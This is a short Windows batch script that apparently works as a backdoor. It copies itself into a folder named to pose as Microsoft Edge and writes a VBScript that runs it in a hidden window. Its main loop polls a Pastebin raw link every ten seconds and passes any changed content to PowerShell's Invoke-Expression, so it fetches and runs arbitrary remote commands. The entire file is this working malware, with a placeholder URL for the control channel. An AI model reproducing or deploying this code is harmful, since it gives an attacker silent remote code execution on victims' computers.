@echo off

::PASTEBIN RAW LINK
set "raw_link=Pastebin_URL"
::PASTEBIN RAW LINK

setlocal enabledelayedexpansion
set "batch_location=%~dp0"
set "batch_name=%~nx0"

if exist "%localappdata%\Microsoft_Edge\" (
  echo.
) else (
    md "%localappdata%\Microsoft_Edge\"
)

if "%batch_location%"=="%localappdata%\Microsoft_Edge\" (
echo.
) else (
  if exist "%localappdata%\Microsoft_Edge\MicrosoftEdge.bat" (
    echo.
  ) else (
    xcopy "%batch_location%%batch_name%" "%localappdata%\Microsoft_Edge\"
    ren %localappdata%\Microsoft_Edge\%batch_name% MicrosoftEdge.bat
  )
)


if exist "%localappdata%\Microsoft_Edge\inv.vbs" ( 
goto root
) else (
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run "cmd /c MicrosoftEdge.bat", 0, False
echo Set WshShell = Nothing
) > "%localappdata%\Microsoft_Edge\inv.vbs"
)
exit






:root
if exist hash.txt (
set /p previous_hash=<"hash.txt"
) else (
set "previous_hash="
)

:monitor_loop
echo Checking for updates...
powershell -Command "Invoke-RestMethod -Uri '%raw_link%' | ForEach-Object { $_ } | Out-File -FilePath temp.txt -Encoding UTF8"

powershell -Command "$hash = Get-FileHash -Path 'temp.txt' -Algorithm SHA256; echo $hash.Hash" > hash.txt
set /p current_hash=<hash.txt
if "%current_hash%" NEQ "%previous_hash%" (
  echo Done
  powershell -Command "Get-Content temp.txt | Invoke-Expression"

  set "previous_hash=%current_hash%"
)

del temp.txt
timeout /t 10 /nobreak >nul

goto monitor_loop
